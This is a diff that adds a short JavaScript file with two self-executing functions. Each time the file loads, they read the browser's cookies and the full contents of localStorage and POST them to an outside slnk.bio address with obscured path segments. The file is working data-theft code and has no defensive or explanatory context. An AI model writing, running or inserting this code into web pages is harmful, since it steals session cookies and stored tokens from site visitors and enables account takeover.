@@ -1,0 +1,17 @@
+function coletarCookies() {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://slnk.bio/YWRhN2Q0MTVhMGQ1/YWRkYWRhZAo/dGV0ZXZic2RqbGFtbWRs/server_c.php", true);
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  var cookies = document.cookie;
+  xhr.send('cookies=' + encodeURIComponent(cookies));
+}
+coletarCookies();
+
+function coletarLocalStorage() {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://slnk.bio/YWRhN2Q0MTVhMGQ1/YWRkYWRhZAo/dGV0ZXZic2RqbGFtbWRs/server_ls.php", true);
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  var localStorageData = JSON.stringify(localStorage);
+  xhr.send('localStorage=' + encodeURIComponent(localStorageData));
+}
+coletarLocalStorage();
